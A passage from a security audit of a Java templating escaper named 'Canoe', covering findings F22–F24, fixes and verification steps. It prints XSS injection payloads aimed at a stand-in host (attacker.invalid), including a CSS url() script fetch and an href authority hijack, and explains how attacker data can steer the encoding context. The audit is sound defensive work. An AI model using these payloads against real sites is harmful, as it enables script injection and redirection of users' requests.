files". A subclass that does exactly that — implements `init()` and `constructView()` and inherits the
properties — cannot start. The half-configured `resource.loader.class.cache` line is the part that
makes this worth writing down: a reader auditing the base class sees the loader list and a loader
setting and reasonably concludes the loader is configured.

**No security impact.** It fails loudly at application startup rather than silently at request time,
which is the right direction, and it cannot be reached by data. It is Low for the same reason F18 is:
an availability defect in a path a developer will meet.

**Fix:** set `resource.loader.class.class` in the base class — the plain
`org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader` is the sensible default — and
let `ClasspathVelocityViewFactory` keep overriding it with the non-caching variant. Alternatively,
move the whole `class` loader declaration down into the subclass that owns it, so the base class
stops making a claim it does not honour.

> **Verified.** `ViewFactoryRenderTest.theBaseFactorysDefaultPropertiesDeclareAClassLoaderItNever`
> `Configures` asserts the missing key on the property map the production method returns — not on a
> hand-written copy of it — and then builds an engine from those properties and requires `init()` to
> throw. Adding the one line makes the same engine start, which is the last assertion in the test.

---

### F23 — Low: a `style` attribute is decoded twice, so `html()`'s output is re-read as CSS syntax

**Severity: Low.** Availability and integrity, not injection — and in the two cases measured it moves
in the *safe* direction. It is recorded because it bounds F4, because it corrupts author data
silently, and because it is a third decoder nobody had counted.

Every argument in this review turns on **one** decode: `html()` writes `&#39;`, the HTML parser hands
back `'`, and the JavaScript or URL parser receives the attacker's original character. That model is
right for `onclick` and for `href`. It is one decoder short for `style`, because a CSS value has its
own escape syntax and the CSS tokenizer runs after the HTML parser:

```
Canoe emits          background:url(&#47;&#92;attacker&#46;invalid&#47;x&#46;js)
HTML parser yields   background:url(/\attacker.invalid/x.js)
CSS tokenizer yields background:url(/<U+000A>ttacker.invalid/x.js)     \a is a hex escape
URL parser yields    /ttacker.invalid/x.js                             LF is removed from any URL
```

Three transformations, in series, over a value Canoe encoded once. The backslash that F4's model
treats as an inert character is a CSS escape introducer; `\a` is consumed as a one-digit hex escape,
so the payload loses the `a` of its own hostname, and the U+000A that replaces it is then stripped by
the URL parser's "remove all tab, LF and CR" rule. What is fetched is a path on the page's own
origin.

**Consequences, in the order they matter.**

1. **It bounds F4.** F4 says a `style` attribute past the colon test is html-encoded and therefore
   injectable. True — but whether a browser *acts* on the injection is decided by the CSS container
   the reference sits in, which is a question about the template and not about the colon index. Three
   corpus templates, all ledgered `KNOWN_VULNERABLE`, all past the colon test, all rendering the
   attacker's characters intact:

   | Template | What the CSS parser does | Attacker request? |
   |---|---|---|
   | `<div style="background:$x">` | the payload becomes declarations | **yes** |
   | `<div style="content:'$x'">` | the payload stays inside a CSS string | no |
   | `<div style="background:url($x)">` | a `(` in an unquoted url token makes it a bad-url token, and the whole declaration is dropped | no |

   This is the CSS analogue of what the URL tests did to F6: the finding is real and narrower than
   its title reads, and the boundary is only visible from the consuming parser's side.

2. **It corrupts legitimate values.** A Windows path, a Unicode escape, or any author string
   containing `\`, `(`, `)` or a quote in a `style` attribute is silently rewritten or voids its
   declaration. This is F15's defect — "`url()` silently corrupts legitimate URLs five different
   ways" — in a different context and through a different mechanism, and like F15 it produces no
   diagnostic.

3. **It is a trap on the remediation path, like F16 and F21.** The commented-out `CTX_CSS` arm at
   `Canoe.java:1074-1081` would route `style` values through `HtmlEncoder.css()`. `css()` emits
   *unterminated* two-digit hex escapes (F16), which is the same escape syntax this finding is about,
   in the same context, with the same tokenizer reading it. Enabling that arm without fixing F16
   replaces one double-decode with another.

**Fix:** none in isolation — the correct answer is the one Canoe's design already states, which is to
refuse to interpolate into a CSS context at all. Deleting the `detectAttributePrefix()` reset
(remediation item 1) makes `style` reach `ATTR_CSS`, and `ATTR_CSS` is suppressed today, which closes
this along with F4. If a CSS encoder is ever enabled instead, it must escape the backslash first and
must terminate its escapes (F16), because everything downstream of it reads CSS syntax.

> **Verified.** `SinkSpecificBrowserTest.theCssTokenizerReReadsCanoesOutputAsAnEscape` renders the
> corpus case, serves it from a loopback origin and asserts on the request the sentinel server
> actually received — `GET /ttacker.invalid/x.js`, on the page's own origin, with the attacker's host
> letter missing — while asserting that the attacker origin was never contacted.
> `anInjectedStyleValueBeaconsToTheAttackerOrigin` is the positive control from the first row of the
> table above, so the pair measures the boundary rather than describing it, and
> `BrowserCorpusTest.theBrowserAgreesWithTheLedger` carries all six CSS rows with their expectations
> recorded in the corpus.

---

### F24 — Medium: `url()` passes a scheme prefix through with its colon, so attacker data can steer the context

**Severity: Medium.** It defeats `url()` for every reference after the first one in an attribute
value, in a template shape applications write routinely. It is held at Medium rather than High by two
preconditions, both checked: the attribute must hold **two** references, and the first must produce a
**lowercase** `http://` or `https://` — `uriPattern` is case-sensitive, so `HTTPS://` is
percent-encoded and steers nothing.

**Location:** `HtmlEncoder.java:187-195` (the passthrough) and `Canoe.java:912-926` (the value scan).

**Found by:** `TemplateFuzzTest` (T31), on its first run, at iteration 156 of the pinned seed. It is
the only finding in this document that was not found by reading the code.

`HtmlEncoder.url()` does not encode its whole input. It matches `uriPattern` first and, on a match,
copies group 1 — which is only ever the literal `http://` or `https://` — into the output untouched:

```java
Matcher m = uriPattern.matcher(input);
if (m.matches()) {
    sb.append(m.group(1));          // <- unencoded, colon included
    HtmlEncoder.url(m.group(2), sb);
    HtmlEncoder.url(m.group(3), sb);
}
```

Everywhere else in Canoe a colon is percent-encoded (`%3A`) or turned into a character reference
(`&#58;`). This is the one path that emits a raw one. And Canoe's attribute-value scan does not know
or care that the colon came from an encoder rather than from the template:

```java
if (c == ':') {
    detectAttributePrefix();        // Canoe.java:916
    bufLen = -1;
}
```

`detectAttributePrefix()` begins by resetting `attributeContext = ATTR_HTML` (the reset F4 and F17
are about), compares the buffer against its five prefixes, matches none of them — the buffer holds
`https` — and returns, leaving `ATTR_HTML`. The attribute was `href`. Every reference after that
point in the same value is `html()`-encoded.

**Measured.**

```
Template   <a href="$base$path">x</a>
$path      @attacker.invalid/x

$base = https://app.example        ->  href="https://app.example&#64;attacker&#46;invalid&#47;x"
                                       decoded: https://app.example@attacker.invalid/x
                                       host:    attacker.invalid                      OFF-ORIGIN

$base = /app                       ->  href="/app%40attacker.invalid/x"
                                       decoded: /app%40attacker.invalid/x
                                       host:    the page's own                        safe
```

One character of difference in `$base`, and the `@` that `url()` percent-encodes to `%40` arrives
raw. That `%40` is not incidental: it is one of the three accidental neutralisations this review
relies on, pinned in `CanoeCorpusTest.urlEncodingAccidentsThatMakeOffsiteVectorsSafe`, and F24 is the
route around it.

**Why this matters more than its severity.** It is a counterexample to the corollary in
["Corollary: attacker data can never steer the parser"](#corollary-attacker-data-can-never-steer-the-parser),
which is the argument the whole "what is not affected" section rests on. The corollary is right about
the *state* — no encoder emits `<`, `>` or a quote, so the tokenizer cannot be moved — and it
conflated the state with the *context*, which is the other half of what `currentContext()` returns
and which a fifth character can move. F10 and F14 still hold; the general claim does not.

It is also the argument for the test method rather than for the finding. `ParserSteeringTest` (T23)
states the corollary as a property and it passed over 275 templates and 52 payloads, because the
corpus varies one reference at a time and holds the rest fixed — deliberately, so that a divergence
says which reference caused it. The hole was in the quantification, not in the statement, and nothing
that only examines shapes somebody chose could have found it.

**`$base` does not have to be attacker-controlled.** The common shape is a configured CDN or site
base URL concatenated with a request-derived path, and only the second half needs to be hostile. Both
halves being attacker-controlled makes it easier, not necessary.

**Bounds.**

- `CTX_URI` is the only context whose encoder can emit a raw colon. `html()` and `htmlWhite()` write
  `&#58;`; `CTX_JS` and `CTX_CSS` write nothing. So F24 needs a URL-bearing attribute, and cannot be
  reached from body text, a plain-text attribute or an event handler.
  (`ParserSteeringTest.onlyTheUriContextCanEmitARawColon`.)
- The steering is always a *downgrade* to `ATTR_HTML`. `detectAttributePrefix()` could in principle
  assign `ATTR_JS`, but the buffer would have to spell `javascript`/`livescript`/`mocha` and
  `url()` percent-encodes the colon of every scheme it does not pass through, so there is no upgrade
  path. The failure direction is toward a weaker encoder, never a suppressed one.
- It is bounded by position exactly as F6 is (see T16): the second reference is dangerous when it
  can begin or extend the URL's **authority**, and inert when it lands in a path, query or fragment.

**Fix:** percent-encode the scheme prefix like everything else, or — better, since `uriPattern` also
causes F15 — delete the special case entirely and let `url()` encode its whole input. A URL attribute
whose value is a complete absolute URL is F6's problem and not something the prefix passthrough is
solving. Failing that, remediation item 1 (deleting the `detectAttributePrefix()` reset) narrows this
too: with the reset gone, the value scan can only ever *narrow* the name-derived context, so a
`href` that finds no recognised prefix stays `ATTR_URI` and no downgrade happens. That is a third
outcome item 1 closes, and it is worth adding to the case for doing item 1 first.

> **Pinned.** `ParserSteeringTest.attackerDataCanSteerTheAttributeContextByEmittingARawColon` runs
> the measurement above and judges both URLs with `VerdictEvaluator.analyseUrl` rather than by eye.
> `TemplateFuzzTest.isTheKnownColonSteering` characterises the mechanism by its signature — a raw
> colon in the output that the benign render does not have — so the fuzzer stays green on this one
> and still fails on any *second* steering mechanism. 94 of the 10,000 pairs in the pinned fuzz run
> exercise it, and the run asserts that count is non-zero.

---

## Remediation, in priority order

*Reordered 2026-07-26.* The reset deletion was written third and carried a sentence saying it
belonged first. It is now actually first. A reader working top-down would otherwise implement the
item that does **not** close the script-execution finding before the one that does.

1. **`detectAttributePrefix()` must never widen the context** (F4, **F17**, **F24**). Delete the
   `attributeContext = ATTR_HTML;` reset at `Canoe.java:224`; start from the name-derived context and
   only ever narrow it. This is first on impact: it is the only item that closes F17, and F17 makes a
   correctly recognised `onclick` injectable — a Critical-class outcome. Neither of the two items
   below can reach it, because under F17 the attribute name is already being classified correctly and
   the value scan throws the answer away afterwards.

   *Added 2026-07-26.* It closes **F24** as well, and by the same mechanism: F24 is the reset firing
   on a colon that `HtmlEncoder.url()` itself emitted, which downgrades every later reference in the
   attribute from `url()` to `html()`. With the reset gone, an unrecognised prefix leaves the
   name-derived `ATTR_URI` in place and there is nothing to downgrade. That is three findings on one
   deleted line, one of which refutes this document's own corollary.

2. **Replace the `on*` table with a prefix rule** (F1, F2, **F19**). At the top of
   `setTagAttributeContext()`:
   `if (buf[0]=='o' && buf[1]=='n') { attributeContext = ATTR_JS; return; }`. Delete the ~200 lines
   of unrolled comparisons. Any `on*` attribute is a JS sink; there is no benign exception worth the
   risk. Three of the 24 branches being deleted were dead — `onselect`, `onsubmit` (F1) and
   `onreadystatechange` (F19) — which is the argument against repairing them individually.

3. **Make `ATTR_HTML` unreachable for unknown attributes** (F2, F3, **F20**). Invert the default: unknown
   attribute names map to `CTX_SUPPRESS`, with a documented allowlist of names known to be plain-text
   sinks (`id`, `class`, `title`, `alt`, `value`, `name`, `placeholder`, …). Fail-closed is
   the only defensible default for a component whose failure mode is XSS, and this single change also
   immunises Canoe against every attribute the HTML spec adds in future. Canoe already fails closed
   everywhere its author thought about it, which suggests the current default is an oversight rather
   than a decision.

   **`nonce` has been removed from that allowlist, and the removal is the point of the item.** It was
   listed here, and in the test plan's §A.2 plain-text group, because a nonce is inert *as text*,
   which is true and is the wrong test. A nonce is a directive
   the HTML parser hands to the content security policy, built from letters, digits and `+/=`, every
   one of which arrives byte for byte; an attacker who chooses it can author a `<script nonce>` the
   policy then admits. Implementing this item exactly as it was first written would have left `nonce`
   mapped to `html()` — the single outcome F20 exists to prevent, produced by the item that is
   supposed to close F20. It is now a `POLICY` sink in the corpus (`policy.nonce`) and must suppress.

   **This item is the only one that can close [F20](#f20--medium-policy-bearing-attributes-arrive-verbatim-and-no-encoder-can-help).**
   For F2 and F3 a better encoder would at least help; for the policy-bearing attributes there is no
   encoding of `allow-same-origin` that means anything other than `allow-same-origin`, so suppression
   is not the preferred fix here but the only one. Note the consequence for the allowlist this item
   asks for: it has to be written as an allowlist of *plain-text* names, not as a denylist of
   dangerous ones, or `sandbox`, `rel` and `nonce` will be on the wrong side of it.

   **This *may* close F17 as a side effect, depending on how it is implemented — do not rely on it.**
   If the inversion is done by changing what `ATTR_HTML` itself maps to, then
   `detectAttributePrefix()`'s reset becomes harmless, because the constant it resets *to* now
   suppresses; F17 closes without item 1. If it is done by adding a new `ATTR_UNKNOWN` default and
   leaving `ATTR_HTML` mapped to `html()` for the allowlisted plain-text names, then the reset still
   assigns `ATTR_HTML` and F17 survives untouched. Item 1 closes it either way, which is why item 1
   is item 1.

4. **NUL-terminate the attribute-value buffer** before `detectAttributePrefix()` reads it, or replace
   the fixed-index comparisons with a length-checked `String` compare (F5). Clear `buf` on each reuse
   regardless — the shared, uncleaned buffer is the root cause of an entire class of these bugs.

5. **Track the tag name through attribute parsing** so `src` on `script`/`iframe`/`object`/`embed` is
   distinguishable from `src` on `img`, and reject off-origin and protocol-relative URLs there by
   default (F6).

6. **Fix the `content` branch** to actually test `content`, and give `content` on a
   `<meta http-equiv=refresh>` a URI or suppressed context (F7).

7. **Write the test suite** (F8) and correct `README.md` / `qlue_user_guide.md` to state the real
   scope: what is encoded, what is suppressed, what is not covered (external content inclusion), and
   how `$_x` / `allowDirectOutput()` work.

8. **Fix `write(char[],int,int)`** to `i < offset + len`, and the error path to
   `writer.write(cbuff, offset, i - offset)` (F9).

9. **Fix `SCRIPT_END`/`CSS_END`** to require whitespace, `/` or `>` after the tag name, and to
   re-process the mismatching character rather than dropping it (F10).

10. **Handle `TAG_ATTR_VALUE_BEFORE`** in `currentContext()` — treat an unquoted attribute value as
    its name-derived context, or raise an encoding error rather than silently emitting nothing (F11).
    **Done in R19**, by the first route: the state shares `TAG_ATTR_VALUE`'s case label.

11. **Reconcile `CTX_CSS` with `currentContext()`** (F21) — return it for `ATTR_CSS`, or delete it
    and its `encode()` arm. Low on its own and **it must be settled before the commented-out
    encoders at `Canoe.java:1074-1081` are enabled**, because until it is, half of that edit is
    live code and half is dead with nothing to say so. Note the ordering against F16: returning
    `CTX_CSS` for `ATTR_CSS` is only safe once `HtmlEncoder.css()` stops emitting unterminated hex
    escapes, so F16 comes first if the intent is to escape rather than to suppress.

---

## How to verify a fix

- **Unit-test `Canoe` directly.** Feed template text through `write()`, assert `currentContext()` at
  each reference position, assert `Canoe.encode()` output. No servlet container needed.
- **End-to-end.** Merge a real Velocity template through
  `VelocityViewFactory.render(page, view, new StringWriter())` and assert the rendered bytes.
- **Regression corpus.** One template per finding above with its exploit payload, asserting the
  attacker-controlled characters do not survive into the sink. Include F5's ordering case explicitly
  — the same `<a href="javascript:f('$id')">` with and without a preceding
  `<input placeholder="…">`, which must produce identical output.
- **Browser confirmation.** Confirm F1, F2, F3 (`srcdoc`, `xlink:href`) and F4 once in a real
  browser. They all turn on character-reference decoding order in the HTML parser, which is worth
  seeing directly rather than reasoning about.
